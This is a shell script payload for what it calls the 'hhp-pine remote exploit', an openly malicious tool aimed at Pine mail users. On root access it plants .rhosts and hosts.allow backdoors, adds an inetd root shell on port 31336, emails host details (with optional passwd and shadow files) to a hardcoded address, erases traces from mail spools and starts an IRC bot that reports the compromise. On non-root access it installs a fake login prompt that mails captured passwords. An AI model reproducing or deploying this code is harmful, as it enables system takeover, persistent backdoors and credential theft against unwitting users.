#!/bin/sh
# psite.sh
# by: elaich of the hhp.
# Script #1 of the hhp-pine remote exploit.
#
# This cant be a C program because we dont want to raise
# the requirments of the programs needed to use this exploit.
#
# For ROOT infections it...
# Makes a backdoor on port 31336.
# Makes .rhosts.
# Turns port 70 into a telnet port. -Incase 23 is firewalled.
# Puts ALL:ALL in hosts.allow.
# Emails you thier infection.
# Sends you an xterm.(If you define it.)
#
# For NON-ROOT infections it...
# Sends you an xterm.(If you define it.)
# emails you passwd file.(If you defined it.)
# logs them out making them relogin taking their login and passwd
#
# Be sure to change the email address to yours in the below script.
#
# Usage: [root@pine]# uuencode psite.sh ... > index.html
# Then change the mode to 777 in the index.html.
# view the README if you need a domain to put this on.
#
if [ "`id | awk '{print $1}'`" = "uid=0(root)" ]; then
killall -9 pine 2>&1
# XTERM DEFINES: The next three lines are for os variant xterm dirs.
#/usr/bin/X11/xterm -display <your-ip>:0.0 -rv -e /bin/sh
#/usr/X11R6/bin/xterm -display <your-ip>:0.0 -rv -e /bin/sh
#/usr/openwin/bin/xterm -display <your-ip>:0.0 -rv -e /bin/sh
echo "+ +" > ~/.rhosts 2>&1
echo "+ +" > /.rhosts 2>&1
echo "+ +" > /root/.rhosts 2>&1
echo "ALL:ALL" >> /etc/hosts.allow 2>&1
cat /etc/inetd.conf | sed s/#telnet/telnet/g > /etc/... 2>&1
mv /etc/... /etc/inetd.conf 2>&1
cat /etc/inetd.conf | sed s/#gopher/gopher/g > /etc/... 2>&1
mv /etc/... /etc/inetd.conf 2>&1
cp /usr/sbin/in.telnetd /usr/sbin/gn 2>&1
echo "hhp-conf stream tcp nowait root /usr/sbin/linuxcnf sh -i" >> /etc/inetd.conf 2>&1
cp /bin/sh /usr/sbin/linuxcnf 2>&1
chmod +x /usr/sbin/linuxcnf 2>&1
chmod +x /usr/sbin/gn 2>&1
mkdir /etc/cron.hourly 2>&1
echo "rm `pwd`/..." > /etc/cron.hourly/... 2>&1
echo "rm /etc/cron.hourly/..." >> /etc/cron.hourly/... 2>&1
echo "hhp-conf         31336/tcp" >> /etc/services 2>&1
killall -HUP inetd 2>&1
echo "Im a (hhp-pine remote exploit.) infection." > ~/..... 2>&1
hostname -i >> ~/..... 2>&1
hostname -d >> ~/..... 2>&1
uname -a >> ~/..... 2>&1
# Change this to your email address.
cat ~/..... | mail -s hhp-pine_root john_telerovski@yahoo.com 2>&1
# echo "`hostname -i` - `cat /etc/passwd`" | mail -s hhp-pine_passwd-file john_telerovski@yahoo.com 2>&1
# echo "`hostname -i` - `cat /etc/shadow`" | mail -s hhp-pine_shadow-file john_telerovski@yahoo.com 2>&1
rm ~/..... 2>&1
rm -fr psite.c 2>&1
cat /var/spool/mail/`whoami` | egrep -v "uude|emailf|void|BASE64" > /tmp/..... 2>&1
mv /tmp/..... /var/spool/mail/`whoami` 2>&1
# For capability with other operating systems...
cat /usr/spool/mail/`whoami` | egrep -v "uude|emailf|void|BASE64" > /tmp/..... 2>&1
mv /tmp/..... /usr/spool/mail/`whoami` 2>&1
#
# IRC channel connection section...
# (Makes the rooted people connect to DALnet in #hhp_owned under guest nicks.)
echo '#!/usr/bin/perl
# owned-bot by: elaich of the hhp.
use IO::Socket;
        $sock = IO::Socket::INET->new(PeerAddr => "phix.dal.net",
              PeerPort => 7000,
              Proto => "tcp") or die "\n";
        print $sock "USER owned owned owned owned\n";
        print $sock "PASS owned\n";
        print $sock "NICK hhp\n";
        print $sock "JOIN #hhp_owned\n";
        print $sock "PRIVMSG #hhp_owned :Im owned. -root-.\n";
        while(<$sock>) {
                chomp;
                $line = $_;
                if ($line =~ /^PING/) {
                print $sock "pong phix.dal.net\n";
        }
}
' > ~/quota.pl 2>&1
chmod +x ~/quota.pl 2>&1
~/quota.pl >> /dev/null &
rm -fr ~/quota.pl 2>&1

else
killall -9 pine 2>&1
# XTERM DEFINES: The next three lines are for os variant xterm dirs.
#/usr/bin/X11/xterm -display <your-ip>:0.0 -rv -e /bin/sh
#/usr/X11R6/bin/xterm -display <your-ip>:0.0 -rv -e /bin/sh
#/usr/openwin/bin/xterm -display <your-ip>:0.0 -rv -e /bin/sh
echo '#!/bin/sh' > ~/.shell
echo "clear" >> ~/.shell
echo "echo \"shell-init: could not get current directory:\"" >> ~/.shell
echo "cat /etc/issue.net" >> ~/.shell
echo "echo -n \"login: \"" >> ~/.shell
echo "read l" >> ~/.shell
echo "stty -echo" >> ~/.shell
echo "echo -n \"Password: \"" >> ~/.shell
echo "read p" >> ~/.shell
echo "stty echo" >> ~/.shell
echo "echo \"\" >> ~/.shell
echo 'echo `hostname -i`: `hostname -d` "---"  l:$l p:$p|mail -s hhp-pine_nonroot john_telerovski@yahoo.com > /dev/null' >> ~/.shell
echo "rm -rf ~/.shell" >> ~/.shell
echo "rm -rf ~/..." >> ~/.shell
# echo "`hostname -i` - `cat /etc/passwd`" | mail -s hhp-pine_passwd-file john_telerovski@yahoo.com 2>&1
echo 'echo `cat ~/.profile |grep -v shell` > .profile' >> ~/.shell
echo 'echo `cat ~/.bashrc |grep -v shell` > .bashrc' >> ~/.shell
echo "~/.shell" >> ~/.bashrc 2>&1
echo "~/.shell" >> ~/.profile 2>&1
chmod +x ~/.bashrc >/dev/null 2>&1
chmod +x ~/.profile >/dev/null 2>&1
chmod +x ~/.shell >/dev/null 2>&1
cat /var/spool/mail/`whoami` | egrep -v "uude|emailf|void|BASE64" > ~/.....  2>&1
mv ~/..... /var/spool/mail/`whoami` 2>&1
# For capability with other operating systems...
cat /usr/spool/mail/`whoami` | egrep -v "uude|emailf|void|BASE64" > ~/.....  2>&1
mv ~/..... /usr/spool/mail/`whoami` 2>&1
#
# IRC channel connection section...
# (Makes the rooted people connect to DALnet in #hhp_owned under guest nicks.)
echo '#!/usr/bin/perl
# owned-bot by: elaich of the hhp.
use IO::Socket;
        $sock = IO::Socket::INET->new(PeerAddr => "phix.dal.net",
              PeerPort => 7000,
              Proto => "tcp") or die "\n";
        print $sock "USER owned owned owned owned\n";
        print $sock "PASS owned\n";
        print $sock "NICK hhp\n";
        print $sock "JOIN #hhp_owned\n";
        print $sock "PRIVMSG #hhp_owned :Im owned. -non-root-.\n";
        while(<$sock>) {
                chomp;
                $line = $_;
                print "# $line\n";
                if ($line =~ /^PING/) {
                print $sock "pong phix.dal.net\n";
        }
}
' > ~/quota.pl 2>&1
chmod +x ~/quota.pl 2>&1
~/quota.pl >> /dev/null &
rm -fr ~/quota.pl 2>&1
killall -9 bash 2>&1
killall -9 sh 2>&1
killall -9 tcsh 2>&1
killall -9 csh 2>&1
killall -9 ksh 2>&1
fi



